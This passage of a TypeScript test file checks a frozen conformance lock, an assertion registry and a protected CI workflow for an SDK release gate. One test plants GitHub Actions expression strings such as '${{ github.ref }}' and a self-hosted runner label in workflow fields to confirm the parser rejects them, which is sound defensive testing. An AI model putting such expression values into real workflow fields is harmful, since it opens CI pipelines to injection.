  const validatorRevisionEnvironment:
    'CLIENT_V1_CONFORMANCE_VALIDATOR_REVISION' =
      workflow.validatorRevisionEnvironment;
  const environment: 'client-v1-conformance' = workflow.environment;
  const artifactNameTemplate: 'client-v1-conformance-{platform}' =
    workflow.artifactNameTemplate;
  const recordPathTemplate:
    '.artifacts/client-v1-conformance-{platform}.json' =
      workflow.recordPathTemplate;
  const sourceRef: 'refs/heads/main' = workflow.sourceRef;
  const darwinRunner: 'macos-14' =
    workflow.runnerLabels['darwin-arm64'][0];
  const linuxRunner: 'ubuntu-24.04' =
    workflow.runnerLabels['linux-x64'][0];
  const windowsRunner: 'windows-2025' =
    workflow.runnerLabels['win32-x64'][0];
  const signerWorkflow:
    'OpenCoven/chat/.github/workflows/client-v1-conformance.yml' =
      workflow.signerWorkflow;
  const predicateType: 'https://slsa.dev/provenance/v1' =
    workflow.predicateType;
  const denySelfHostedRunners: true = workflow.denySelfHostedRunners;
  const darwinArtifact:
    'client-v1-conformance-darwin-arm64' = workflow.artifacts[0].name;
  const linuxArtifact:
    '.artifacts/client-v1-conformance-linux-x64.json' =
      workflow.artifacts[1].recordPath;
  const windowsPlatform: 'win32-x64' = workflow.artifacts[2].platform;
  const source: {
    path: 'scripts/executable-resolution.mjs';
    size: number;
    sha256: string;
  } = workflow.unixToolPathSource;
  const scriptSha256Fields: string[] = [
    workflow.windowsBootstrapScriptSha256,
    workflow.validatorRevisionScriptSha256,
    workflow.phase1RevisionsScriptSha256,
    workflow.linuxKeyringSetupScriptSha256,
    workflow.unixSupervisorPreparationScriptSha256,
    workflow.unixToolPathScriptSha256,
    workflow.unixProductionScriptSha256,
    workflow.unixValidationScriptSha256,
    workflow.validationGuardScriptSha256,
    workflow.validationScriptSha256,
    workflow.attestationScriptSha256,
  ];
  void name;
  void path;
  void job;
  void jobNameTemplate;
  void aggregationJob;
  void aggregationJobName;
  void aggregationRunner;
  void validationJob;
  void validationJobName;
  void attestationJob;
  void attestationJobName;
  void downloadArtifactAction;
  void attestationAction;
  void validatorRevisionEnvironment;
  void environment;
  void artifactNameTemplate;
  void recordPathTemplate;
  void sourceRef;
  void darwinRunner;
  void linuxRunner;
  void windowsRunner;
  void signerWorkflow;
  void predicateType;
  void denySelfHostedRunners;
  void darwinArtifact;
  void linuxArtifact;
  void windowsPlatform;
  void source;
  void scriptSha256Fields;
}

function compatibleWorkflowRuntimeKeys(): string[][] {
  const source = readFileSync(conformanceContractRuntimePath, 'utf8');
  const sourceFile = ts.createSourceFile(
    conformanceContractRuntimePath,
    source,
    ts.ScriptTarget.Latest,
    true,
    ts.ScriptKind.JS,
  );
  const workflowKeySets: string[][] = [];
  const visit = (node: ts.Node): void => {
    if (
      ts.isCallExpression(node)
      && ts.isIdentifier(node.expression)
      && node.expression.text === 'expectExactObject'
      && node.arguments.length >= 2
    ) {
      const keys = node.arguments[1];
      if (
        keys !== undefined
        && ts.isArrayLiteralExpression(keys)
        && keys.elements.some(
          (element) =>
            ts.isStringLiteral(element)
            && element.text === 'validatorRevisionEnvironment',
        )
      ) {
        workflowKeySets.push(keys.elements.map((element) => {
          if (!ts.isStringLiteral(element)) {
            throw new Error(
              'Compatible workflow exact-object keys must be string literals',
            );
          }
          return element.text;
        }));
      }
    }
    ts.forEachChild(node, visit);
  };
  visit(sourceFile);
  return workflowKeySets;
}

function compatibleWorkflowDeclarationKeys(): {
  keys: string[];
  references: number;
} {
  const source = readFileSync(conformanceContractDeclarationPath, 'utf8');
  const sourceFile = ts.createSourceFile(
    conformanceContractDeclarationPath,
    source,
    ts.ScriptTarget.Latest,
    true,
    ts.ScriptKind.TS,
  );
  let keys: string[] | undefined;
  let references = 0;
  const visit = (node: ts.Node): void => {
    if (
      ts.isInterfaceDeclaration(node)
      && node.name.text === 'CompatibleConformanceWorkflow'
    ) {
      keys = node.members.map((member) => {
        if (
          !ts.isPropertySignature(member)
          || member.name === undefined
          || !ts.isIdentifier(member.name)
        ) {
          throw new Error(
            'CompatibleConformanceWorkflow members must be properties',
          );
        }
        return member.name.text;
      });
    }
    if (
      ts.isPropertySignature(node)
      && node.name !== undefined
      && ts.isIdentifier(node.name)
      && node.name.text === 'workflow'
      && node.type !== undefined
      && ts.isTypeReferenceNode(node.type)
      && ts.isIdentifier(node.type.typeName)
      && node.type.typeName.text === 'CompatibleConformanceWorkflow'
    ) {
      references += 1;
    }
    ts.forEachChild(node, visit);
  };
  visit(sourceFile);
  return { keys: keys ?? [], references };
}

function readLock(): Record<string, unknown> {
  const readFrozenConformanceLock = requiredFunction(
    'readFrozenConformanceLock',
  );
  return readFrozenConformanceLock(lockPath as never) as Record<string, unknown>;
}

function readRegistry(): Record<string, unknown> {
  return contract.readAssertionRegistry(registryPath) as unknown as Record<
    string,
    unknown
  >;
}

function createCompatibleLock(
  lock: Record<string, unknown> = readLock(),
): Record<string, unknown> {
  return {
    ...structuredClone(lock),
    evidenceProducer: structuredClone(TEST_COMPATIBLE_PRODUCER),
  };
}

function reverseObjectKeys(value: unknown): unknown {
  if (Array.isArray(value)) {
    return value.map(reverseObjectKeys);
  }
  if (value === null || typeof value !== 'object') {
    return value;
  }
  return Object.fromEntries(
    Object.entries(value)
      .reverse()
      .map(([key, nested]) => [key, reverseObjectKeys(nested)]),
  );
}

function artifactMetadata(
  path: string,
  bytes: Buffer,
): { path: string; size: number; sha256: string } {
  return {
    path,
    size: bytes.byteLength,
    sha256: sha256(bytes),
  };
}

function createCaveEngine(registry: Record<string, unknown>) {
  const assertions = registry.assertions as {
    cave: string[];
  };
  const coverageId = assertions.cave.at(-1);
  if (coverageId === undefined) {
    throw new Error('Frozen Cave assertion registry is empty.');
  }
  const expectedWithoutCoverage = assertions.cave.slice(0, -1);
  const findings = [
    {
      id: 'frozen-test-finding',
      where: 'docs/api/client-v1.md',
      says: 'documented behavior',
      measured: 'observed behavior',
      severity: 'documentation',
      why: 'test fixture',
    },
  ];
  const notCovered = [
    'The SDK and Chat halves live in other repositories.',
    'The production Coven daemon is covered by the cross-repository run.',
    'A genuinely remote peer is outside this release gate.',
    'Write scopes are outside this read-only release.',
    'OAuth and desktop consent UI are outside this release gate.',
    'Cross-process pairing state is outside the process-local contract.',
  ];

  return {
    COVERAGE_ASSERTION_ID: coverageId,
    FINDINGS: findings,
    NOT_COVERED: notCovered,
    expectedAssertionIds() {
      throw new Error('aggregation must not derive Cave IDs dynamically');
    },
    checkAssertionCoverage(
      entries: readonly { id: string }[],
      expected: readonly string[],
    ) {
      const counts = new Map<string, number>();
      for (const entry of entries) {
        if (entry.id === coverageId) continue;
        counts.set(entry.id, (counts.get(entry.id) ?? 0) + 1);
      }
      const failures: string[] = [];
      for (const id of expected) {
        const count = counts.get(id) ?? 0;
        if (count === 0) failures.push(`missing ${id}`);
        if (count > 1) failures.push(`duplicate ${id}`);
      }
      for (const id of counts.keys()) {
        if (!expected.includes(id)) failures.push(`unexpected ${id}`);
      }
      return failures;
    },
    summarizeConformance(entries: readonly { result: string }[]) {
      const passed = entries.filter(({ result }) => result === 'pass').length;
      const failed = entries.filter(({ result }) => result === 'fail').length;
      const skipped = entries.filter(({ result }) => result === 'skip').length;
      return {
        total: entries.length,
        passed,
        failed,
        skipped,
        status: failed > 0 ? 'failed' : 'passed',
      };
    },
    renderConformanceRecord(
      entries: Array<{ id: string; result: string; detail: string }>,
      context: {
        ranAt: string;
        caveVersion: string;
        commit: string;
        platform: string;
        includeTtl: boolean;
        authorityTakeover: Record<string, unknown>;
        notCovered: string[];
        findings: Array<Record<string, unknown>>;
      },
    ) {
      return {
        harness: 'scripts/client-v1-conformance.mjs',
        issues: [
          'OpenCoven/coven-cave#4832',
          'OpenCoven/coven-cave#4838',
        ],
        scope: 'cave-only',
        ranAt: context.ranAt,
        caveVersion: context.caveVersion,
        commit: context.commit,
        platform: context.platform,
        nodeVersion: 'v24.18.1',
        includeTtl: context.includeTtl,
        authorityTakeover: context.authorityTakeover,
        notCovered: context.notCovered,
        findings: context.findings,
        summary: this.summarizeConformance(entries),
        assertions: entries,
      };
    },
    expectedWithoutCoverage,
  };
}

function createPlatformEvidence(
  platform: (typeof PLATFORMS)[number],
  lock: Record<string, unknown>,
  registry: Record<string, unknown>,
) {
  lock = createCompatibleLock(lock);
  const candidate = lock.candidate as {
    repository: string;
    commit: string;
    tree: string;
    releaseManifest: Record<string, unknown>;
    sdkPackages: Array<Record<string, unknown>>;
    cavePackageFiles: Array<Record<string, unknown>>;
  };
  const sources = lock.sources as {
    cave: {
      repository: string;
      commit: string;
      tree: string;
      releaseVersion: string;
      files: Array<Record<string, unknown>>;
    };
    coven: {
      repository: string;
      commit: string;
      tree: string;
      releaseVersion: string;
    };
    chat: {
      repository: string;
      commit: string;
      tree: string;
      consumerLock: Record<string, unknown>;
      vendorFiles: Array<Record<string, unknown>>;
    };
  };
  const toolchain = lock.toolchain as {
    nodeVersion: string;
    pnpmVersion: string;
    rustVersion: string;
    tauriVersion: string;
  };
  const producer =
    (
      lock.evidenceProducer as
        | typeof TEST_COMPATIBLE_PRODUCER
        | { status?: string }
    ).status === 'compatible'
      ? (lock.evidenceProducer as typeof TEST_COMPATIBLE_PRODUCER)
      : TEST_COMPATIBLE_PRODUCER;
  const evidenceSchema = lock.evidenceSchema as {
    path: string;
    size: number;
    sha256: string;
  };
  const harnessContract = producer.harness as {
    path: string;
    version: string;
  };
  const scanners = lock.scanners as {
    redaction: { name: string; version: string };
    retainedEvidence: { name: string; version: string };
  };
  const assertions = registry.assertions as {
    cave: string[];
    sdk: string[];
    chat: {
      common: string[];
      platforms: Record<(typeof PLATFORMS)[number], string[]>;
    };
  };
  const caveEngine = createCaveEngine(registry);
  const caveAssertions = assertions.cave.map((id) => ({
    id,
    result: 'pass',
    detail: id === caveEngine.COVERAGE_ASSERTION_ID ? 'complete' : '',
  }));
  const startedAt = '2026-08-29T04:00:00.000Z';
  const completedAt = '2026-08-29T04:00:01.000Z';
  const [os, arch] = platform.split('-');
  const nativeBackend = {
    'darwin-arm64': 'macos-keychain',
    'linux-x64': 'linux-keyring',
    'win32-x64': 'windows-credential-manager',
  }[platform];
  const identityBackend =
    platform === 'win32-x64'
      ? 'windows-named-pipe-client-identity'
      : 'unix-peer-credentials';
  const lockBytes = Buffer.from(
    contract.serializeCanonicalJson(lock),
    'utf8',
  );
  const registryBytes = readFileSync(registryPath);
  const caveRecord = caveEngine.renderConformanceRecord(caveAssertions, {
    ranAt: startedAt,
    caveVersion: sources.cave.releaseVersion,
    commit: sources.cave.commit,
    platform,
    includeTtl: true,
    authorityTakeover: {
      authorityMode: 'enforce',
      discoveryVersion: 2,
      mechanism: 'hpke-bound-v1',
    },
    notCovered: caveEngine.NOT_COVERED,
    findings: caveEngine.FINDINGS,
  });

  return {
    schemaVersion: 2,
    issue: 'OpenCoven/sdk#38',
    platform,
    timing: {
      startedAt,
      completedAt,
      durationMs: 1_000,
    },
    environment: {
      os,
      arch,
      nodeVersion: toolchain.nodeVersion,
      pnpmVersion: toolchain.pnpmVersion,
      rustVersion: toolchain.rustVersion,
      tauriVersion: toolchain.tauriVersion,
      nativeCustody: {
        backend: nativeBackend,
        available: true,
      },
      covenIdentity: {
        backend: identityBackend,
        available: true,
      },
    },
    releases: {
      cave: sources.cave.releaseVersion,
      coven: sources.coven.releaseVersion,
    },
    provenance: {
      candidate: {
        repository: candidate.repository,
        commit: candidate.commit,
        tree: candidate.tree,
      },
      validator: {
        repository: 'OpenCoven/sdk',
        commit: 'e'.repeat(40),
        tree: 'd'.repeat(40),
        contract: {
          path: 'scripts/conformance-contract.mjs',
          size: 32_768,
          sha256: 'a'.repeat(64),
        },
        schema: {
          path: evidenceSchema.path,
          size: evidenceSchema.size,
          sha256: evidenceSchema.sha256,
        },
      },
      cave: {
        repository: sources.cave.repository,
        commit: sources.cave.commit,
        tree: sources.cave.tree,
      },
      coven: {
        repository: sources.coven.repository,
        commit: sources.coven.commit,
        tree: sources.coven.tree,
      },
      chat: {
        repository: sources.chat.repository,
        commit: sources.chat.commit,
        tree: sources.chat.tree,
      },
    },
    harness: {
      name: harnessContract.path,
      version: harnessContract.version,
      repository: producer.repository,
      commit: producer.commit,
      tree: producer.tree,
      invocationId: '123e4567-e89b-42d3-a456-426614174000',
    },
    artifacts: {
      frozenLock: artifactMetadata(
        'conformance/client-v1-cross-repository-lock.json',
        lockBytes,
      ),
      assertionRegistry: artifactMetadata(
        'conformance/client-v1-cross-repository-assertions.json',
        registryBytes,
      ),
      releaseManifest: candidate.releaseManifest,
      sdkPackages: candidate.sdkPackages,
      candidateCaveFiles: candidate.cavePackageFiles,
      caveAuthorityFiles: sources.cave.files,
      consumerLock: sources.chat.consumerLock,
      chatVendorFiles: sources.chat.vendorFiles,
    },
    caveRecord,
    sdkAssertions: assertions.sdk.map((id) => ({
      id,
      result: 'pass',
      diagnosticId: 'phase1.assertion.passed',
    })),
    chatAssertions: [
      ...assertions.chat.common,
      ...assertions.chat.platforms[platform],
    ].map((id) => ({
      id,
      result: 'pass',
      diagnosticId: 'phase1.assertion.passed',
    })),
    coverage: {
      cave: true,
      coven: true,
      sdk: true,
      chat: true,
    },
    notCovered: registry.notCovered,
    isolation: {
      strategy: 'process-owned-temporary-roots',
      network: 'loopback-only',
      sourceCheckoutDependency: false,
      workspaceLinkDependency: false,
      retainedPrivatePaths: false,
      retainedSocketHandles: false,
      roots: [
        'cave-home',
        'coven-home',
        'consumer-home',
        'native-credential-store',
      ].map((id, index) => ({
        id,
        opaqueId: `${index + 1}`.repeat(32),
        ownershipVerified: true,
        removedAfterRun: true,
      })),
      operatorState: [
        'cave-home',
        'coven-home',
        'native-credential-store',
        'projects',
      ].map((id, index) => ({
        id,
        beforeSha256: `${index + 5}`.repeat(64),
        afterSha256: `${index + 5}`.repeat(64),
      })),
    },
    scans: {
      redaction: {
        status: 'passed',
        scanner: scanners.redaction.name,
        version: scanners.redaction.version,
      },
      retainedEvidence: {
        status: 'passed',
        scanner: scanners.retainedEvidence.name,
        version: scanners.retainedEvidence.version,
      },
    },
  };
}

function aggregate(records: Array<Record<string, unknown>>) {
  const lock = createCompatibleLock();
  const registry = readRegistry();
  const caveEngine = createCaveEngine(registry);
  const lockBytes = Buffer.from(
    contract.serializeCanonicalJson(lock),
    'utf8',
  );
  const registryBytes = readFileSync(registryPath);
  const sources = lock.sources as {
    cave: { files: Array<{ path: string; sha256: string }> };
  };
  const engine = sources.cave.files.find(
    ({ path }) => path === 'scripts/client-v1-conformance.mjs',
  );
  if (engine === undefined) {
    throw new Error('Frozen Cave engine metadata is missing.');
  }
  return contract.aggregateConformanceEvidence({
    caveEngine,
    caveEngineSha256: engine.sha256,
    assertionRegistrySha256: sha256(registryBytes),
    frozenLockSha256: sha256(lockBytes),
    frozenLockSize: lockBytes.byteLength,
    frozenLock: lock,
    canonicalPlatforms: PLATFORMS,
    registry,
    platformRecords: records,
  } as never);
}

describe('unresolved SDK #38 conformance gaps', () => {
  test('keeps compatible workflow declarations in parity with both runtime parsers', () => {
    const runtimeKeySets = compatibleWorkflowRuntimeKeys();
    const declaration = compatibleWorkflowDeclarationKeys();

    expect(runtimeKeySets).toHaveLength(2);
    expect(runtimeKeySets[1]).toEqual(runtimeKeySets[0]);
    expect(declaration.keys).toEqual(runtimeKeySets[0]);
    expect(declaration.references).toBe(2);
    expect(COMPATIBLE_WORKFLOW_DECLARATIONS_MATCH).toBe(true);
    expect(compileCompatibleWorkflowDeclaration).toBeTypeOf('function');
  });

  test('freezes the exact candidate, manifest, package, source, and consumer bytes', () => {
    const lock = readLock() as {
      candidate: {
        commit: string;
        tree: string;
        releaseManifest: {
          file: string;
          size: number;
          sha256: string;
        };
        sdkPackages: Array<{
          packageName: string;
          releaseFile: string;
          vendorPath: string;
          size: number;
          sha256: string;
        }>;
        cavePackageFiles: Array<{ path: string; size: number; sha256: string }>;
      };
      sources: {
        cave: { commit: string; tree: string };
        coven: { commit: string; tree: string };
        chat: {
          commit: string;
          tree: string;
          consumerLock: { path: string; size: number; sha256: string };
        };
      };
    };

    expect(lock.candidate).toMatchObject({
      commit: 'acc38488f00860d246c3c553375634d64806eabb',
      tree: '643be6db60736dc8bd7b01873dcd1c14f26d93ef',
      releaseManifest: {
        file: 'release-manifest.json',
        size: 1_031,
        sha256:
          'b8bfb62236fc8add4a9baad9f00e5401db15074a2d21fe2847a9158104cefb3c',
      },
    });
    expect(lock.candidate.sdkPackages).toEqual([
      {
        packageName: '@opencoven/sdk-core',
        version: '0.1.0',
        releaseFile: 'tarballs/core/opencoven-sdk-core-0.1.0.tgz',
        vendorPath: 'vendor/opencoven-sdk/sdk-core-0.1.0.tgz',
        size: 33_284,
        sha256:
          '9a574e8bd5178ce2aa20db97e8a741c7c9569515546a2d3089406f41a9d040fe',
      },
      {
        packageName: '@opencoven/cave-client',
        version: '0.1.0',
        releaseFile: 'tarballs/cave/opencoven-cave-client-0.1.0.tgz',
        vendorPath: 'vendor/opencoven-sdk/cave-client-0.1.0.tgz',
        size: 81_543,
        sha256:
          'c44544adf8e712d6be1e8686788e63aa0133eb318274d1fb1926138a7da148c0',
      },
      {
        packageName: '@opencoven/coven-client',
        version: '0.1.0',
        releaseFile: 'tarballs/coven/opencoven-coven-client-0.1.0.tgz',
        vendorPath: 'vendor/opencoven-sdk/coven-client-0.1.0.tgz',
        size: 33_009,
        sha256:
          'cba09410aeae9670173a1f7bfe3174b5dd610873358944ed0955c86ac56a3aa1',
      },
      {
        packageName: '@opencoven/sdk',
        version: '0.1.0',
        releaseFile: 'tarballs/sdk/opencoven-sdk-0.1.0.tgz',
        vendorPath: 'vendor/opencoven-sdk/sdk-0.1.0.tgz',
        size: 15_833,
        sha256:
          'eee7557feeaf4719d0cb990a66fdddf62270dbbeb05cfe7e35efbfe22827d04f',
      },
    ]);
    expect(lock.candidate.cavePackageFiles).toEqual([
      {
        path: 'packages/cave/fixtures/contract-fixture.json',
        size: 12_308,
        sha256:
          'b2694cd1a70a2ddd81b54ee43ade1ff5aa1ecd661fa6e41e5b7acedd8db400bd',
      },
      {
        path: 'packages/cave/fixtures/contract-fixture.sha256',
        size: 65,
        sha256:
          '6e847024eae72a6fa31e911f54393948152edf17892200316b94950abfd9a4c6',
      },
      {
        path: 'packages/cave/fixtures/contract-fixture.provenance.json',
        size: 333,
        sha256:
          'bbb6d3a1c75d75144ca44dfc2f3f84991d9db075cdb9a887eb419a1bfe737d4e',
      },
      {
        path: 'packages/cave/fixtures/hpke-bound-v1-vectors.json',
        size: 4_041,
        sha256:
          'f806967291de12175277b6b24ac3c7bba912ae760fd8227fb21b1a4d5f5e6797',
      },
      {
        path: 'packages/cave/fixtures/hpke-bound-v1-vectors.sha256',
        size: 65,
        sha256:
          '20a0e7737d940fd661cb95ba1d1b9fda01eac840fbdff667c64659966ca3d544',
      },
    ]);
    expect(lock.sources).toMatchObject({
      cave: {
        commit: '6325fc4c1154c7d7398074a9760a2e2dc323b424',
        tree: '9144939792d3dbdd91c208d7e2abc5ecc0eac089',
      },
      coven: {
        commit: '721437b84026c042e431b0882dcd14fdb29ac07d',
        tree: '7cc5988b5a06f3f279e5c034cf2228775bd2b0e0',
      },
      chat: {
        commit: 'edd4728792321771496df58bfc0e6122908a96ec',
        tree: 'c373902b48b06520450f520e669a34f72b64a35d',
        consumerLock: {
          path: 'pnpm-lock.yaml',
          size: 56_222,
          sha256:
            'd2f0db8eca64112324e861bb7cbd2b645ed9ae4aad836200855b3477f3ea49ae',
        },
      },
    });

    expect(
      execFileSync(
        'git',
        [
          '-C',
          workspaceRoot,
          'rev-parse',
          'acc38488f00860d246c3c553375634d64806eabb^{tree}',
        ],
        { encoding: 'utf8' },
      ).trim(),
    ).toBe(lock.candidate.tree);
    for (const expected of lock.candidate.cavePackageFiles) {
      const bytes = execFileSync(
        'git',
        [
          '-C',
          workspaceRoot,
          'show',
          `acc38488f00860d246c3c553375634d64806eabb:${expected.path}`,
        ],
        { encoding: 'buffer' },
      );
      expect(bytes.byteLength).toBe(expected.size);
      expect(sha256(bytes)).toBe(expected.sha256);
    }
  });

  test('binds the ordered platform matrix and immutable schema bytes through the lock', () => {
    const lock = readLock() as {
      schemaVersion: number;
      platformMatrix: string[];
      evidenceSchema: {
        identity: string;
        path: string;
        version: number;
        size: number;
        sha256: string;
      };
      assertionRegistry: {
        path: string;
        size: number;
        sha256: string;
      };
    };
    const schemaText = readFileSync(schemaPath, 'utf8');
    const registryText = readFileSync(registryPath, 'utf8');
    const schema = JSON.parse(schemaText) as {
      $id?: string;
      'x-opencoven-frozen-contract'?: {
        assertionRegistry?: Record<string, unknown>;
        platformMatrix?: string[];
        schemaVersion?: number;
      };
    };
    const validateFrozenConformanceBindings = requiredFunction(
      'validateFrozenConformanceBindings',
    );

    expect(lock.schemaVersion).toBe(2);
    expect(lock.platformMatrix).toEqual(PLATFORMS);
    expect(lock.evidenceSchema).toEqual({
      identity:
        'urn:opencoven:schema:client-v1-cross-repository-platform-evidence:2',
      path: 'conformance/client-v1-cross-repository-evidence.schema.json',
      version: 2,
      size: Buffer.byteLength(schemaText, 'utf8'),
      sha256: sha256(schemaText),
    });
    expect(schema.$id).toBe(lock.evidenceSchema.identity);
    expect(schema['x-opencoven-frozen-contract']).toEqual({
      schemaVersion: 2,
      platformMatrix: PLATFORMS,
      assertionRegistry: lock.assertionRegistry,
    });
    expect(() =>
      validateFrozenConformanceBindings(
        lock as never,
        schemaText as never,
        registryText as never,
      ),
    ).not.toThrow();
    expect(() =>
      validateFrozenConformanceBindings(
        lock as never,
        schemaText.replace(
          'OpenCoven Client v1 cross-repository platform evidence',
          'drifted evidence schema',
        ) as never,
        registryText as never,
      ),
    ).toThrow('Evidence schema bytes do not match the frozen lock');
    expect(() =>
      validateFrozenConformanceBindings(
        lock as never,
        schemaText as never,
        `${registryText} ` as never,
      ),
    ).toThrow('Assertion registry bytes do not match the frozen lock');
  });

  test('freezes the compatible Chat schema-v2 producer and protected workflow', () => {
    const lock = readLock() as {
      evidenceProducer: Record<string, unknown>;
    };
    const assertEvidenceProducerCompatibility = requiredFunction(
      'assertEvidenceProducerCompatibility',
    );

    expect(lock.evidenceProducer).toEqual({
      status: 'compatible',
      repository: 'OpenCoven/chat',
      commit: 'cac7d8eb2516b1a74a3357582513bfef1623f17a',
      tree: 'b8e7ef47a3edca101cbda165853b36f975305249',
      packageManifest: {
        path: 'package.json',
        size: 3_944,
        sha256:
          'edcca437eafe9600c526515c89f551113179b4152699b52f337bdb0cf07614bf',
      },
      harness: {
        path: 'scripts/phase1-conformance.mjs',
        version: '2.0.0',
        size: 187_131,
        sha256:
          'cc374d616d9de0a0cd94ce2ced5847fd877e124323acce3fca31f3df35d67d1b',
      },
      command: 'test:phase1-conformance',
      recordSchemaVersion: 2,
      workflow: {
        name: 'client-v1 conformance',
        path: '.github/workflows/client-v1-conformance.yml',
        size: 457_825,
        sha256:
          '1904746089bfa3fe079efdc686a9a12dd0f836f4bcfdc4a0df214f9e7e6c52a4',
        job: 'platform-conformance',
        jobNameTemplate: 'platform-conformance ({platform})',
        aggregationJob: 'aggregate-conformance',
        aggregationJobName: 'aggregate-conformance',
        aggregationRunnerLabels: ['ubuntu-24.04'],
        validationJob: 'validate-conformance-artifacts',
        validationJobName: 'validate-conformance-artifacts',
        attestationJob: 'attest-conformance-artifacts',
        attestationJobName: 'attest-conformance-artifacts',
        environment: 'client-v1-conformance',
        environmentId: '20863036831',
        artifactNameTemplate: 'client-v1-conformance-{platform}',
        recordPathTemplate:
          '.artifacts/client-v1-conformance-{platform}.json',
        artifacts: TEST_STATIC_ARTIFACTS,
        downloadArtifactAction: DOWNLOAD_ARTIFACT_ACTION,
        attestationAction: ATTEST_BUILD_PROVENANCE_ACTION,
        windowsBootstrapScriptSha256:
          '6369a4e7c94bed2e3236c509e07e8cd56694d94e747116378b5c90705304ead6',
        validatorRevisionScriptSha256:
          '9abbfe73f19e47650321e6afb2c2a7db4facbf05a72db30241dfa94261cdcad9',
        phase1RevisionsScriptSha256:
          '507ce777b643d97154472eb23135f7965fd55cf0fcedcec30e93b23e6472d225',
        linuxKeyringSetupScriptSha256:
          '26e6bb6da4d80617c99d6edeb577c2026910ffc3b1ee70df03bed5fb8d149a51',
        unixSupervisorPreparationScriptSha256:
          'c95a284efe2a8897bab224478f994139dbf1947cd2d87ce01bd8e142eef7e8f3',
        unixToolPathSource: {
          path: 'scripts/executable-resolution.mjs',
          size: 9_154,
          sha256:
            '31e3c412ff8c835f14522f36a59e91f4a4ba82913210ae8e3b4455217503f430',
        },
        unixToolPathScriptSha256:
          '209d2d6035b7608f8ddd613f0abb0dd972eb9302648a7c4ff9cd2b9d7a208ab6',
        unixProductionScriptSha256:
          '54d3046d2927cf6e0eb29e75dc3c89ccbd8dd458913de1fbc7689621269cb96d',
        unixValidationScriptSha256:
          'b0ce7139bdf365d420c7dde478282f117cce97c1bec63d07cd95b64057121a89',
        validationGuardScriptSha256:
          '9abbfe73f19e47650321e6afb2c2a7db4facbf05a72db30241dfa94261cdcad9',
        validationScriptSha256:
          '72a2c0810c535d4e3d5e2b0c76bfc1822dc43d54ee653bb034fb977125dbd734',
        attestationScriptSha256:
          '24af6732396013e8c1f23404cf38b5332e5a276c034d530c80d02247cb2a7347',
        validatorRevisionEnvironment:
          'CLIENT_V1_CONFORMANCE_VALIDATOR_REVISION',
        sourceRef: 'refs/heads/main',
        runnerLabels: {
          'darwin-arm64': ['macos-14'],
          'linux-x64': ['ubuntu-24.04'],
          'win32-x64': ['windows-2025'],
        },
        signerWorkflow:
          'OpenCoven/chat/.github/workflows/client-v1-conformance.yml',
        signerDigest: 'cac7d8eb2516b1a74a3357582513bfef1623f17a',
        sourceDigest: 'cac7d8eb2516b1a74a3357582513bfef1623f17a',
        predicateType: 'https://slsa.dev/provenance/v1',
        denySelfHostedRunners: true,
      },
    });
    expect(
      assertEvidenceProducerCompatibility(lock as never),
    ).toEqual(
      lock.evidenceProducer,
    );
  });

  test('requires full checkout history so the locked Chat harness revision is available', () => {
    const lock = readLock() as {
      evidenceProducer: {
        workflow: {
          unixProductionScriptSha256: string;
        };
      };
    };
    expect(sha256(TEST_UNIX_PRODUCTION_COMMAND)).toBe(
      lock.evidenceProducer.workflow.unixProductionScriptSha256,
    );
    expect(sha256(TEST_WINDOWS_BOOTSTRAP_COMMAND)).toBe(
      '6369a4e7c94bed2e3236c509e07e8cd56694d94e747116378b5c90705304ead6',
    );
    expect(sha256(TEST_WINDOWS_CHILD_BOOTSTRAP)).toBe(
      '92d3c242dad7fc89ff36ba8df1e9f38c98e8a52bb310e35a811b61885e552e6b',
    );
    expect(() =>
      verifyProtectedWorkflow(
        TEST_PRODUCER_WORKFLOW_TEXT,
        TEST_COMPATIBLE_PRODUCER as never,
        {
          nodeVersion: 'v24.18.1',
          pnpmVersion: 'pnpm@10.34.0',
          rustVersion: '1.95.0',
          tauriVersion: '2.11.4',
        },
      ),
    ).not.toThrow();
  });

  test('freezes the future protected workflow identity and runner graph', () => {
    const mutations: Array<
      (workflow: Record<string, unknown>) => void
    > = [
      (workflow) => {
        workflow.name = '${{ github.ref }}';
      },
      (workflow) => {
        workflow.jobNameTemplate = '${{ matrix.name }} ({platform})';
      },
      (workflow) => {
        workflow.aggregationJobName = '${{ github.sha }}';
      },
      (workflow) => {
        workflow.sourceRef = 'refs/heads/release';
      },
      (workflow) => {
        workflow.aggregationRunnerLabels = ['macos-14'];
      },
      (workflow) => {
        workflow.runnerLabels = {
          'darwin-arm64': ['macos-14'],
          'linux-x64': ['self-hosted-linux'],
          'win32-x64': ['windows-2025'],
        };
      },
    ];

    for (const mutate of mutations) {
      const lock = createCompatibleLock();
      const producer = lock.evidenceProducer as {
        workflow: Record<string, unknown>;
      };
      mutate(producer.workflow);
      expect(() =>
        contract.parseFrozenConformanceLock(
          contract.serializeCanonicalJson(lock),
          'mutated compatible producer',
        ),
      ).toThrow(/does not identify a schema-v2 Chat producer/u);
    }
  });

  test('freezes every Cave assertion and the complete exclusion set', () => {
    const registry = readRegistry() as {
      schemaVersion: number;
      provenance: {
        commit: string;
        tree: string;
        engine: { path: string; size: number; sha256: string };
      };
      requiredSubjects: string[];
      assertions: {
        cave: string[];
        sdk: string[];
        chat: {
          common: string[];
          platforms: Record<(typeof PLATFORMS)[number], string[]>;
        };
      };
      notCovered: Array<{ scopeId: string; diagnosticId: string }>;
    };

    expect(registry.schemaVersion).toBe(2);
    expect(registry.provenance).toEqual({
      repository: 'OpenCoven/coven-cave',
      commit: '6325fc4c1154c7d7398074a9760a2e2dc323b424',
      tree: '9144939792d3dbdd91c208d7e2abc5ecc0eac089',
      engine: {
        path: 'scripts/client-v1-conformance.mjs',
        size: 146_432,
        sha256:
          'b611d2b2935dad3cf913eda45e30ba109ba2ab53dadfef8670a26c7c03b115dd',
      },
      includeTtl: true,
      includeAuthorityTakeover: true,
    });
    expect(registry.requiredSubjects).toEqual(['cave', 'coven', 'sdk', 'chat']);
    expect(registry.assertions.cave).toHaveLength(110);
    expect(registry.assertions.cave.at(-1)).toBe(
      'harness.assertion-coverage',
    );
    expect(registry.notCovered).toEqual([
      {
        scopeId: 'cross-process-pairing',
        diagnosticId: 'phase1.scope.cross-process-pairing.not-covered',
      },
      {
        scopeId: 'oauth-ui',
        diagnosticId: 'phase1.scope.oauth-ui.not-covered',
      },
      {
        scopeId: 'remote-peer',
        diagnosticId: 'phase1.scope.remote-peer.not-covered',
      },
      {
        scopeId: 'write-apis',
        diagnosticId: 'phase1.scope.write-apis.not-covered',
      },
    ]);
    expect(registry.notCovered.map(({ scopeId }) => scopeId)).not.toContain(
      'sdk',
    );
    expect(registry.notCovered.map(({ scopeId }) => scopeId)).not.toContain(
      'chat',
    );
